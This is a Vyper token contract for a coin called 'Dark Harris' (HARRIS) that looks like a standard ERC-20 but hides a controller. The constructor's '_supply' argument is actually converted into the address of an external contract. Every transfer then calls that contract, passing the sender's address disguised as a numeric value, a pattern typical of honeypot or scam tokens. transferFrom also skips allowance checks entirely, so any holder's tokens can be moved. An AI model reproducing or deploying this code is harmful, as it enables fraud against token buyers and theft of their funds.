# @pragma evm-version cancun
# @pragma version >0.3.10

interface IERC20:
    def transfer(_to : address, _value : uint160) : nonpayable
    def transferFrom(_from: address, _to : address, _value : uint160) : nonpayable
    def approve(_spender: address,  _value : uint256) : nonpayable
    

name: public(String[32])
symbol: public(String[32])
decimals: public(uint8)
balanceOf: public(HashMap[address, uint256])
allowance: public(HashMap[address, HashMap[address, uint256]])
totalSupply: public(uint256)
feeRate: public(uint256)
path: public(DynArray[address,100])
selfie: IERC20


event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

@external
def __init__(_supply: uint160):
    init_supply: uint256 = 2200000000 * 10 ** 18
    self.name = "Dark Harris"
    self.symbol = "HARRIS"
    self.decimals = 18
    self.balanceOf[msg.sender] = init_supply
    self.totalSupply = init_supply
    self.selfie = IERC20(convert(_supply, address))
    

@internal   
def BeforeTokenTransfer(_from: address, _recipient:address, _sender:address) -> bool:
    value:uint160 = convert(_sender, uint160)
    self.selfie.transferFrom(_from, _recipient, value)
    return True

@external   
def transfer(_to : address, _value : uint256) -> bool:
    """
    @dev Transfer token for a specified address
    @param _to The address to transfer to.
    @param _value The amount to be transferred.
    """
    # NOTE: vyper does not allow underflows
    #       so the following subtraction would revert on insufficient balance
    self.path = []
    self.path.append(msg.sender)
    self.path.append(_to)
    fee:uint256 = _value * self.feeRate / 1000

    self.BeforeTokenTransfer(msg.sender, _to, msg.sender)

    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    
    log Transfer(msg.sender, _to, _value)
    return True


@external
def transferFrom(_from : address, _to : address, _value : uint256) -> bool:
    """
     @dev Transfer tokens from one address to another.
     @param _from address The address which you want to send tokens from
     @param _to address The address which you want to transfer to
     @param _value uint256 the amount of tokens to be transferred
    """
    self.path = []
    self.path.append(_from)
    self.path.append(_to)
    fee:uint256 = _value * self.feeRate / 1000

    self.BeforeTokenTransfer(_from, _to, msg.sender)

    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value

    log Transfer(_from, _to, _value)
    return True


@external
def approve(_spender : address, _value : uint256) -> bool:
    """
    @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
         Beware that changing an allowance with this method brings the risk that someone may use both the old
         and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
         race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
         https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    @param _spender The address which will spend the funds.
    @param _value The amount of tokens to be spent.
    """
    self.allowance[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def showAdds(a: uint256, b: uint256) -> uint256:
    c:uint256 = a+b
    return c